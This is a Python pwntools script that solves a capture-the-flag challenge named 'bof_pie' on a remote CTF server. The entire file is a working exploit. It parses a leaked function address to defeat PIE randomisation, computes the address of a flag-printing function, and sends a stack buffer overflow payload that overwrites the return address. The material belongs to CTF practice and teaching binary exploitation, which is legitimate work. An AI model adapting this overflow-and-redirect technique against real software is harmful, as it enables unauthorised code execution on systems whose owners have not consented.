#!/usr/bin/python3

from pwn import *

p = remote("ctf.j0n9hyun.xyz", 3008)

elf = ELF("./bof_pie")

flagOffset = elf.symbols['j0n9hyun']
welcomeOffset = elf.symbols['welcome']

p.recvuntil("j0n9hyun is ")
welcome = int(p.recvuntil("\n").decode('utf-8').strip("\n"), 16)

pie = welcome - welcomeOffset
flag = pie + flagOffset
log.info("Flag is Mapeed " + hex(flag))

padding = b"A"*0x16

payload = padding
payload += p32(flag)

p.sendline(payload)
p.recvline()
log.info(p.recvline().decode('utf-8'))
